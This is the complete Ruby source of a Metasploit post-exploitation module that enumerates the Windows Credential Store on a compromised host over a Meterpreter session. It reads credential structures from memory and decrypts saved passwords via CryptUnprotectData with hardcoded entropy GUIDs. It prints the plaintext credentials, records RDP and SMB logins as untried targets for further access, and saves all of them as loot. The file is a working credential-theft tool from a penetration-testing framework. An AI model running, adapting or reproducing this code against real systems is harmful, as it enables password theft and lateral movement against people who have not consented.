##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'            => "Windows Gather Credential Store Enumeration and Decryption Module",
      'Description'     => %q{
          This module will enumerate the Microsoft Credential Store and decrypt the
        credentials. This module can only access credentials created by the user the
        process is running as.  It cannot decrypt Domain Network Passwords, but will
        display the username and location.
      },
      'License'         => MSF_LICENSE,
      'Platform'        => ['win'],
      'SessionTypes'    => ['meterpreter'],
      'Author'          => ['Kx499']
    ))

  end

  #############################
  #RAILGUN HELPER FUNCTIONS
  ############################
  def is_86
    if @is_86_check.nil?
      pid = session.sys.process.open.pid
      @is_86_check = session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
    end

    @is_86_check
  end

  def pack_add(data)
    if is_86
      addr = [data].pack("V")
    else
      addr = [data].pack("Q<")
    end
    return addr
  end

  def mem_write(data, length)
    pid = session.sys.process.open.pid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
    mem = process.memory.allocate(length)
    process.memory.write(mem, data)
    return mem
  end

  def read_str(address,len,type)
    begin
      pid = session.sys.process.open.pid
      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
      raw = process.memory.read(address, len)
      if type == 0 #unicode
        str_data = raw.gsub("\x00","")
      elsif type == 1 #null terminated
        str_data = raw.unpack("Z*")[0]
      elsif type == 2 #raw data
        str_data = raw
      end
    rescue
      str_data = nil
    end
    return str_data || "Error Decrypting"
  end

  def decrypt_blob(daddr, dlen, type)
    #type 0 = passport cred, type 1 = wininet cred
    #set up entropy
    c32 = session.railgun.crypt32
    guid = "82BD0E67-9FEA-4748-8672-D5EFE5B779B0" if type == 0
    guid = "abe2869f-9b47-4cd9-a358-c22904dba7f7" if type == 1
    ent_sz = 74
    salt = []
    guid.each_byte do |c|
      salt << c*4
    end
    ent = salt.pack("s*")

    #write entropy to memory
    mem = mem_write(ent,1024)

    #prep vars and call function
    addr = pack_add(daddr)
    len = pack_add(dlen)
    eaddr = pack_add(mem)
    elen = pack_add(ent_sz)

    if is_86
      ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,8)
      len,add = ret["pDataOut"].unpack("V2")
    else
      ret = c32.CryptUnprotectData("#{len}#{addr}",16,"#{elen}#{eaddr}",nil,nil,0,16)
      len,add = ret["pDataOut"].unpack("Q<2")
    end

    #get data, and return it
    return "" unless ret["return"]
    return read_str(add, len, 0)
  end

  def gethost(hostorip)
    #check for valid ip and return if it is
    return hostorip if Rex::Socket.dotted_ip?(hostorip)

    ## get IP for host
    vprint_status("Looking up IP for #{hostorip}")
    result = client.net.resolve.resolve_host(hostorip)
    return result[:ip] if result[:ip]
    return nil if result[:ip].nil? or result[:ip].empty?
  end

  def report_db(cred)
    ip_add = nil
    host = ""
    port = 0
    begin
      if cred["targetname"].include? "TERMSRV"
        host = cred["targetname"].gsub("TERMSRV/","")
        port = 3389
        service = "rdp"
      elsif cred["type"] == 2
        host = cred["targetname"]
        port = 445
        service = "smb"
      else
        return false
      end

      ip_add= gethost(host)

      unless ip_add.nil?
        service_data = {
          address: ip_add,
          port: port,
          protocol: "tcp",
          service_name: service,
          workspace_id: myworkspace_id
        }

        credential_data = {
          origin_type: :session,
          session_id: session_db_id,
          post_reference_name: self.refname,
          username: cred["username"],
          private_data: cred["password"],
          private_type: :password
        }

        credential_core = create_credential(credential_data.merge(service_data))

        login_data = {
          core: credential_core,
          access_level: "User",
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        create_credential_login(login_data.merge(service_data))
        print_status("Credentials for #{ip_add} added to db")
      else
        return
      end
    rescue ::Exception => e
      print_error("Error adding credential to database for #{cred["targetname"]}")
      print_error(e.to_s)
    end
  end

  def get_creds
    credentials = []
    #call credenumerate to get the ptr needed
    adv32 = session.railgun.advapi32
    begin
      ret = adv32.CredEnumerateA(nil,0,4,4)
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("This module requires WinXP or higher")
      print_error("CredEnumerateA() failed: #{e.class} #{e}")
      ret = nil
    end
    if ret.nil?
      count = 0
      arr_len = 0
    else
      p_to_arr = ret["Credentials"].unpack("V")
      if is_86
        count = ret["Count"]
        arr_len = count * 4
      else
        count = ret["Count"] & 0x00000000ffffffff
        arr_len = count * 8
      end
    end

    #tell user what's going on
    print_status("#{count} credentials found in the Credential Store")
    return credentials unless arr_len > 0
    if count > 0
      print_status("Decrypting each set of credentials, this may take a minute...")

      #read array of addresses as pointers to each structure
      raw = read_str(p_to_arr[0], arr_len, 2)
      pcred_array = raw.unpack("V*") if is_86
      pcred_array = raw.unpack("Q<*") unless is_86

      #loop through the addresses and read each credential structure
      pcred_array.each do |pcred|
        cred = {}
        if is_86
          raw = read_str(pcred, 52, 2)
        else
          raw = read_str(pcred, 80, 2)
        end

        cred_struct = raw.unpack("VVVVQ<VVVVVVV") if is_86
        cred_struct = raw.unpack("VVQ<Q<Q<Q<Q<VVQ<Q<Q<") unless is_86
        cred["flags"] = cred_struct[0]
        cred["type"] = cred_struct[1]
        cred["targetname"] = read_str(cred_struct[2], 512, 1)
        cred["comment"] = read_str(cred_struct[3], 256, 1)
        cred["lastdt"] = cred_struct[4]
        cred["persist"] = cred_struct[7]
        cred["attribcnt"] = cred_struct[8]
        cred["pattrib"] = cred_struct[9]
        cred["targetalias"] = read_str(cred_struct[10], 256, 1)
        cred["username"] = read_str(cred_struct[11], 513, 1)

        if cred["targetname"].include?('TERMSRV')
          cred["password"] = read_str(cred_struct[6], cred_struct[5], 0)
        elsif cred["type"] == 1
          decrypted = decrypt_blob(cred_struct[6], cred_struct[5], 1)
          cred["username"] = decrypted.split(':')[0] || "No Data"
          cred["password"] = decrypted.split(':')[1] || "No Data"
        elsif cred["type"] == 4
          cred["password"] = decrypt_blob(cred_struct[6],cred_struct[5], 0)
        else
          cred["password"] = "unsupported type"
        end

        #only add to array if there is a target name
        unless cred["targetname"] == "Error Decrypting" or cred["password"] == "unsupported type"
          print_status("Credential sucessfully decrypted for: #{cred["targetname"]}")
          credentials << cred
        end
      end
    else
      print_status("No Credential are available for decryption")
    end
    return credentials
  end

  def run
    creds = get_creds
    #store all data to loot if data returned
    if not creds.empty?
      creds.each do |cred|
        credstr = "\t Type: "
        credstr << cred["type"].to_s
        credstr << "  User: "
        credstr << cred["username"]
        credstr << "  Password: "
        credstr << cred["password"]
        print_good(cred["targetname"])
        print_line(credstr)
        #store specific  creds to db
        report_db(cred)
        print_line("")
      end


      print_status("Writing all data to loot...")
      path = store_loot(
        'credstore.user.creds',
        'text/plain',
        session,
        creds,
        'credstore_user_creds.txt',
        'Microsoft Credential Store Contents')
      print_good("Data saved in: #{path}")
    end
  end
end
